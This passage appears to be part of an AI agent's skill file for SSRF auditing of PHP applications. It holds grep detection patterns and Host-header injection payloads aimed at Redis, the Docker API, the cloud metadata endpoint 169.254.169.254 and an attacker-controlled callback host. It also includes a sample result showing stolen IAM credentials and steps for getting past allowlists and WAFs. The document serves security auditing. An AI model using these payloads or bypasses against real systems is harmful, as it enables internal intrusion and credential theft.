grep -rn '->getHost()\|->getHttpHost()' . | grep -i 'http\|url\|api'

# Find SERVER_NAME (also affected by Host header in some configurations)
grep -rn '$_SERVER\[.SERVER_NAME.\]' . | grep -v 'echo\|print'

# Framework-specific — Laravel
grep -rn 'request()->getHost()\|Request::getHost()\|\$request->host()' .

# Framework-specific — Symfony
grep -rn 'getSchemeAndHttpHost()\|getHost()\|getHttpHost()' .
```

### Attack Techniques

**Basic attack — Modify Host Header to point to internal service:**
```http
GET /api/proxy HTTP/1.1
Host: 127.0.0.1:6379
Connection: close
```

If the application concatenates `Host` as `http://127.0.0.1:6379/api/internal/...`, the request goes to Redis.

**Multiple Host Header injection:**
```http
GET /page HTTP/1.1
Host: legitimate.com
Host: 127.0.0.1
```
Some web servers take the first Host, others take the last, causing parsing differentials.

**X-Forwarded-Host override:**
```http
GET /page HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: 169.254.169.254
X-Host: 169.254.169.254
X-Forwarded-Server: 169.254.169.254
```
Some frameworks (e.g., Symfony `Request::getHost()`) prioritize `X-Forwarded-Host` under trusted proxy configuration.

**Host Header + port injection:**
```http
GET /api/data HTTP/1.1
Host: legitimate.com:@127.0.0.1:2375/containers/json#
```
If the application uses Host directly in URL construction, authority injection can be achieved via the `@` symbol.

**Callback scenario exploitation:**
```http
POST /register-webhook HTTP/1.1
Host: attacker-controlled.com

# Application concatenates Host as callback URL:
# http://attacker-controlled.com/webhook/callback
# Internal service will call back to attacker's server on trigger, leaking internal data
```

### Detection Pattern Summary

```bash
# Comprehensive detection script: Find all Host header → URL construction paths
echo "=== Direct HTTP_HOST in URL ==="
grep -rn 'http.*\$_SERVER.*HTTP_HOST' --include="*.php" .

echo "=== getHost() in URL construction ==="
grep -rn 'http.*->getHost\(\)\|http.*->getHttpHost\(\)' --include="*.php" .

echo "=== SERVER_NAME in URL ==="
grep -rn 'http.*\$_SERVER.*SERVER_NAME' --include="*.php" .

echo "=== Potential callback URL construction ==="
grep -rn 'callback.*HTTP_HOST\|webhook.*HTTP_HOST\|notify.*getHost' --include="*.php" .
```

### Key Insight

> The danger of Host Header SSRF lies in its stealth: developers assume `$_SERVER['HTTP_HOST']` is "the server's own domain name," when in reality it is entirely client-controlled. The audit focus is NOT searching for conventional sinks like `curl_exec` or `file_get_contents`, but tracing the data flow of `HTTP_HOST` / `getHost()` — once it is concatenated as the authority part of a URL (scheme://HOST/path), it constitutes SSRF. Pay special attention to scenarios where misconfigured Symfony trusted_proxies causes `X-Forwarded-Host` to be trusted.



## Output Contract

| Output File | Path | Description |
|-------------|------|-------------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | Final verdict + all round records |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |

## Examples

### ✅ GOOD Example — Complete, Valid Exploit Result

```json
{
  "sink_id": "ssrf_fetch_001",
  "final_verdict": "confirmed",
  "rounds_executed": 5,
  "successful_round": 3,
  "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "evidence_result": "Response contains IAM role 'webapp-role' with AccessKeyId and SecretAccessKey",
  "severity": {
    "level": "C",
    "score": 2.85,
    "cvss": 9.5
  }
}
```

**Why this is good:**
- `evidence_result` contains specific, verifiable proof of exploitation
- `severity` scoring is consistent: score 2.85 → cvss 9.5 → level `C`
- `rounds_executed` shows progressive effort, not a single blind attempt
- All required fields are populated with concrete values

### ❌ BAD Example — Incomplete, Invalid Exploit Result

```json
{
  "sink_id": "ssrf_fetch_001",
  "final_verdict": "confirmed",
  "rounds_executed": 1,
  "successful_round": 1,
  "payload": "http://127.0.0.1",
  "evidence_result": "",
  "failure_reason": "",
  "severity": {
    "level": "M",
    "score": null
  }
}
```

**Issues:**
- evidence_result is empty — no internal service response shown
- failure_reason is empty — no details about what was accessed
- severity_level 'M' for SSRF reaching cloud metadata — should be C or H

---

## Pre-submission Self-check (MUST execute)

After completing the exploit JSON, perform item-by-item self-check per `shared/auditor_self_check.md`:

1. Execute generic 8 items (G1-G8); proceed only after all ✅
2. Execute the specific self-check items below (S1-S3); submit only after all ✅
3. Any item ❌ → fix and re-check; MUST NOT skip

### Specific Self-check (SSRF Auditor specific)
- [ ] S1: Request targets (internal IP/cloud metadata/local services) have been annotated
- [ ] S2: DNS rebinding or protocol switching scenarios have been evaluated
- [ ] S3: Specific content of internal network information leaked in responses has been captured

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Internal network unreachable from container | Test with alternative internal IPs (`127.0.0.1`, `0.0.0.0`, IPv6 `::1`); if all blocked → record `"status": "network_restricted"` |
| URL allowlist blocks request | Attempt bypass via DNS rebinding, URL parser differential, or redirect chain; if blocked → record `"url_allowlist_enforced": true` |
| No out-of-band callback received | Increase wait time, try alternative OOB channels (DNS, HTTP); if none → record `"status": "no_oob_response"` |
| Payload blocked by WAF/filter | Log filter type, switch to encoded URL variant; if all variants fail → record `"waf_blocked": true` |
